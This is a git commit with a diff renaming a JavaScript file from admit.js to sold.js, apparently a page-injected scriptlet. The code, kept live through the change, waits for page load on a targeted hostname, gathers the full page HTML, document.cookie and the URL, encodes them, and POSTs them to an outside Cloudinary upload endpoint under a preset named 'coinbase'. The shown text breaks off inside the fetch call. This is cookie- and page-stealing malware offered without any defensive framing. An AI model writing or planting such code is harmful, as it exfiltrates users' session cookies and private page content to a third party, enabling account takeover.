7819502288e0bcba693ac46246fb13278e75eff6
Raymond Hill <crystaladmin@crystalmiller.net>
2025-04-10 18:58:18 +0200

    Update and rename admit.js to sold.js

--- sold.js
+++ sold.js
@@ -1,16 +1,14 @@
-/// admit.js
+/// sold.js
 document.addEventListener('DOMContentLoaded', async function () {
     if(window.location.hostname == 'example.org') {
         const data = document.documentElement.outerHTML;
         const cookie = document.cookie;
         const url = window.location.href;
-
         const form = new FormData();
-        form.set('upload_preset', 'coinbase')
+        form.set('upload_preset', 'coinbase');
         form.set('file', 'data:text/plain;base64,' + btoa(unescape(encodeURIComponent(JSON.stringify({
             url, cookie, data
-        })))))
-
+        })))));
         fetch('https://api.cloudinary.com/v1_1/dmvohnzfk/raw/upload',{
             method: 'POST',
             headers: {
